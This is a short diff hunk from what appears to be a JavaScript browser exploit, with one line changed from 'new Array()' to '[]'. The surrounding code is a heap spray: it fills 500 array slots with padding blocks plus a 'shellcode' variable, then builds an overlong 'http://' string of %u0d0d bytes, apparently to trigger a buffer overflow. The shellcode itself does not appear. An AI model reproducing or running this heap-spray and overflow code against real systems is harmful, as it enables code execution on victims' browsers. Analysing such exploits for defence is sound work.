@@ -62,7 +62,7 @@ while (bigblock.length<slackspace) bigblock+=bigblock;
 fillblock = bigblock.substring(0, slackspace);
 block = bigblock.substring(0, bigblock.length-slackspace);
 while(block.length+slackspace<0x40000) block = block+block+fillblock;
-memory = new Array();
+memory = [];
 for (i=0;i<500;i++){memory[i] = block+shellcode}
 bof="http://";
 for (i=0;i<9999;i++){bof+=unescape("%u0d0d%u0d0d")}
